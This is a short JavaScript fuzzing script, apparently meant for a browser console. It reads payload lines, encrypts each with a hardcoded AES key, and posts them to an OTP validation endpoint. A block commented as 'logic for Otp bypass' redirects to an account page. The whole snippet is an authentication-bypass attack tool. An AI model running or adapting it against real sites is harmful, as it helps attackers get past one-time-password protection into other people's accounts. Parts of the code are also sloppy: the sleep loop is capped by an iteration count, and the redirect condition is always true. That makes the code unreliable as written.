
//payload::
function payloads(){
var x = document.createElement("textarea");
x.setAttribute('id', 'payloads');
document.body.appendChild(x);
}

// Fuzzing logic::
function fuzz(){
var textArea = document.getElementById('payloads');
var lines = textArea.value.split('\n');

for (var j = 0; j < lines.length; j++) {

// write your logic here...
console.log('Payload: ' + lines[j]);
  
  // your AES Key and IV
  var mykey = "myKey123"

  //Call encryption method
  otpEncrypt = CryptoJS.AES.encrypt( lines[j], mykey, {format: CryptoJSAesJson} );

  //Encrypted Payload
  console.log('Encrypted Payload: ' + otpEncrypt);

  //Prepare post request
  $.post("otpvalidate.php",{
    otp: otpEncrypt.toString()
  },

  //Handle Response
  function(res){

    //Call Decrypt method
    var data2 = CryptoJS.AES.decrypt(JSON.stringify(res), mykey, {format: CryptoJSAesJson}).toString(CryptoJS.enc.Utf8);
    var data = JSON.parse(data2);
    
    //Decrypted response
    console.log(data);

    //logic for Otp bypass
    var a = data[10];
    $("#message").html(data.slice(23,36));
    if(a == a)
      window.location.href="my_account.php";
  },"json");
    //sleep
    sleep(3000);
}

// sleep function
function sleep(milliseconds) {
  var start = new Date().getTime();
  for (var i = 0; i < 1e7; i++) {
    if ((new Date().getTime() - start) > milliseconds){
      break;
    }
  }
}
}
